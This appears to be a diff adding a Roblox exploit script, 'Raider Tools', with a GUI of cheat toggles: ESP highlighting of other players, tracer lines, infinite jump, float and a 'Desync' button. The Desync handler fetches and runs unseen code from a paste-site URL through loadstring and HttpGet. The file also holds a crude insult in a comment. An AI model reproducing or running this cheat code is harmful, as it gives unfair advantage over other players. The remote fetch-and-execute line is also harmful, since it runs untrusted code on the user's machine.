@@ -1,0 +1,281 @@
+local Players = game:GetService("Players")
+local LP = Players.LocalPlayer
+local UIS = game:GetService("UserInputService")
+local RS = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+ 
+local Gui = Instance.new("ScreenGui")
+Gui.Name = "RaiderTools"
+Gui.ResetOnSpawn = false
+Gui.Parent = LP:WaitForChild("PlayerGui")
+ 
+local Main = Instance.new("Frame")
+Main.Size = UDim2.new(0, 190, 0, 240)
+Main.Position = UDim2.new(0.15, 0, 0.25, 0)
+Main.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
+Main.Active = true
+Main.Draggable = true
+Main.Parent = Gui
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 10)
+ 
+local Title = Instance.new("TextLabel", Main)
+Title.Size = UDim2.new(1, -30, 0, 30)
+Title.Position = UDim2.new(0, 10, 0, 5)
+Title.BackgroundTransparency = 1
+Title.Text = "Raider Tools"
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 16
+Title.TextColor3 = Color3.fromRGB(255,255,255)
+ 
+local Min = Instance.new("TextButton", Main)
+Min.Size = UDim2.new(0, 18, 0, 18)
+Min.Position = UDim2.new(1, -22, 0, 6)
+Min.BackgroundTransparency = 1
+Min.Text = "-"
+Min.TextScaled = true
+Min.Font = Enum.Font.GothamBlack
+Min.TextColor3 = Color3.fromRGB(220,220,220)
+ 
+local Scroll = Instance.new("ScrollingFrame", Main)
+Scroll.Size = UDim2.new(1, -20, 1, -40)
+Scroll.Position = UDim2.new(0, 10, 0, 40)
+Scroll.CanvasSize = UDim2.new(0,0,0,0)
+Scroll.ScrollBarThickness = 3
+Scroll.BackgroundTransparency = 1
+ 
+local Layout = Instance.new("UIListLayout", Scroll)
+Layout.Padding = UDim.new(0, 10)
+Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+ 
+local function UpdateScroll()
+	Scroll.CanvasSize = UDim2.new(0, 0, 0, Layout.AbsoluteContentSize.Y + 10)
+end
+Layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(UpdateScroll)
+ 
+local function MakeButton(name)
+	local Btn = Instance.new("TextButton")
+	Btn.Size = UDim2.new(1, -10, 0, 36)
+	Btn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+	Btn.Text = name
+	Btn.Font = Enum.Font.Gotham
+	Btn.TextSize = 14
+	Btn.TextColor3 = Color3.new(1,1,1)
+	Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 8)
+	Btn.Parent = Scroll
+ 
+	local toggled = false
+ 
+	local function SetToggle(state)
+		toggled = state
+		local colorGoal = {BackgroundColor3 = toggled and Color3.fromRGB(25, 150, 25) or Color3.fromRGB(45,45,45)}
+		TweenService:Create(Btn, TweenInfo.new(0.2), colorGoal):Play()
+		return toggled
+	end
+ 
+	return Btn, SetToggle
+end
+ 
+local function Notify(t)
+	local F = Instance.new("Frame")
+	F.Size = UDim2.new(0, 180, 0, 38)
+	F.Position = UDim2.new(1, -200, 1, -70)
+	F.BackgroundColor3 = Color3.fromRGB(25,25,25)
+	F.BackgroundTransparency = 1
+	F.Parent = Gui
+	Instance.new("UICorner", F).CornerRadius = UDim.new(0, 8)
+ 
+	local S = Instance.new("UIStroke", F)
+	S.Thickness = 1.8
+	S.Color = Color3.fromRGB(255,255,255)
+ 
+	local L = Instance.new("TextLabel", F)
+	L.Size = UDim2.new(1,0,1,0)
+	L.BackgroundTransparency = 1
+	L.Text = t
+	L.Font = Enum.Font.GothamBold
+	L.TextSize = 15
+	L.TextColor3 = Color3.fromRGB(255,255,255)
+	L.TextTransparency = 1
+ 
+	TweenService:Create(F, TweenInfo.new(0.25), {BackgroundTransparency = 0.1}):Play()
+	TweenService:Create(L, TweenInfo.new(0.25), {TextTransparency = 0}):Play()
+ 
+	task.wait(1)
+ 
+	local t1 = TweenService:Create(F, TweenInfo.new(0.25), {BackgroundTransparency = 1})
+	local t2 = TweenService:Create(L, TweenInfo.new(0.25), {TextTransparency = 1})
+	t1:Play()
+	t2:Play()
+	t1.Completed:Wait()
+	F:Destroy()
+end
+ 
+local BtnESP, SetESP = MakeButton("ESP")
+local BtnJump, SetJump = MakeButton("Infinite Jump")
+local BtnFloat, SetFloat = MakeButton("Float Upwards")
+local BtnTracers, SetTracers = MakeButton("Tracers")
+local BtnDesync, SetDesync = MakeButton("Desync")
+ 
+local complexJumpEnabled = false
+local verticalBoost = 42
+local sustainTime = 0.12
+local sustainBoost = 28
+ 
+local function ComplexJump()
+	if not complexJumpEnabled then return end
+	local c = LP.Character
+	if not c then return end
+	local hrp = c:FindFirstChild("HumanoidRootPart")
+	if hrp then
+		hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, verticalBoost, hrp.AssemblyLinearVelocity.Z)
+		task.wait(sustainTime)
+		hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, sustainBoost, hrp.AssemblyLinearVelocity.Z)
+	end
+end
+ 
+UIS.JumpRequest:Connect(function()
+	if complexJumpEnabled then ComplexJump() end
+end)
+ 
+local espEnabled = false
+local espData = {}
+ 
+local function ApplyESP(p)
+	if not espEnabled or p == LP then return end
+	local c = p.Character
+	if not c then return end
+	local H = Instance.new("Highlight")
+	H.FillTransparency = 0.25
+	H.FillColor = Color3.fromRGB(255,0,0)
+	H.OutlineColor = Color3.fromRGB(255,40,40)
+	H.Parent = c
+	espData[p] = H
+end
+ 
+local function RefreshESP()
+	for _, h in pairs(espData) do h:Destroy() end
+	espData = {}
+	if espEnabled then
+		for _, p in ipairs(Players:GetPlayers()) do
+			if p ~= LP then ApplyESP(p) end
+		end
+	end
+end
+ 
+Players.PlayerAdded:Connect(function(pl)
+	pl.CharacterAdded:Connect(function()
+		if espEnabled then
+			task.wait(0.2)
+			ApplyESP(pl)
+		end
+	end)
+end)
+ 
+local cam = workspace.CurrentCamera
+local tracerEnabled = false
+local lines = {}
+ 
+local function NewLine(p)
+	if lines[p] then return end
+	local L = Drawing.new("Line")
+	L.Thickness = 7
+	L.Color = Color3.fromRGB(255,0,0)
+	lines[p] = L
+end
+ 
+local function ClearLines()
+	for _, L in pairs(lines) do L:Remove() end
+	lines = {}
+end
+ 
+RS.RenderStepped:Connect(function()
+	if not tracerEnabled then ClearLines() return end
+	for _, p in ipairs(Players:GetPlayers()) do
+		if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+			local hrp = p.Character.HumanoidRootPart
+			local v, ok = cam:WorldToViewportPoint(hrp.Position)
+			NewLine(p)
+			local L = lines[p]
+			if ok then
+				L.Visible = true
+				L.From = Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y)
+				L.To = Vector2.new(v.X, v.Y)
+			else
+				L.Visible = false
+			end
+		end
+	end
+end)
+ 
+local floatEnabled = false
+local floatSpeed = 15
+ 
+RS.Heartbeat:Connect(function()
+	if floatEnabled and LP.Character then
+		local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
+		if hrp then
+			hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, floatSpeed, hrp.AssemblyLinearVelocity.Z)
+		end
+	end
+end)
+ 
+BtnJump.MouseButton1Click:Connect(function()
+	complexJumpEnabled = SetJump(not complexJumpEnabled)
+	Notify("Jump: "..(complexJumpEnabled and "ON" or "OFF"))
+end)
+ 
+BtnESP.MouseButton1Click:Connect(function()
+	espEnabled = SetESP(not espEnabled)
+	RefreshESP()
+	Notify("ESP: "..(espEnabled and "ON" or "OFF"))
+end)
+ 
+BtnTracers.MouseButton1Click:Connect(function()
+	tracerEnabled = SetTracers(not tracerEnabled)
+	Notify("Tracers: "..(tracerEnabled and "ON" or "OFF"))
+end)
+ 
+BtnFloat.MouseButton1Click:Connect(function()
+	floatEnabled = SetFloat(not floatEnabled)
+	Notify("Float: "..(floatEnabled and "ON" or "OFF"))
+end)
+ 
+--
+--your gay
+--
+ 
+BtnDesync.MouseButton1Click:Connect(function()
+	SetDesync(true)
+	Notify("Desync activated")
+ 
+loadstring(game:HttpGet("https://pastefy.app/MJw2J4T6/raw"))()
+ 
+	task.wait(0.7)
+	SetDesync(false)
+	Notify("Desync finished")
+end)
+ 
+local Circle = Instance.new("Frame")
+Circle.Size = UDim2.new(0, 45, 0, 45)
+Circle.BackgroundColor3 = Color3.fromRGB(28,28,28)
+Circle.Position = Main.Position
+Circle.Visible = false
+Circle.Active = true
+Circle.Draggable = true
+Circle.Parent = Gui
+Instance.new("UICorner", Circle).CornerRadius = UDim.new(1,0)
+ 
+Circle.InputBegan:Connect(function(i)
+	if i.UserInputType == Enum.UserInputType.MouseButton1 then
+		Circle.Visible = false
+		Main.Visible = true
+		TweenService:Create(Main, TweenInfo.new(0.2), {Size = UDim2.new(0,190,0,240)}):Play()
+	end
+end)
+ 
+Min.MouseButton1Click:Connect(function()
+	TweenService:Create(Main, TweenInfo.new(0.18), {Size = UDim2.new(0,0,0,0)}):Play()
+	task.wait(0.18)
+	Main.Visible = false
+	Circle.Visible = true
+end)
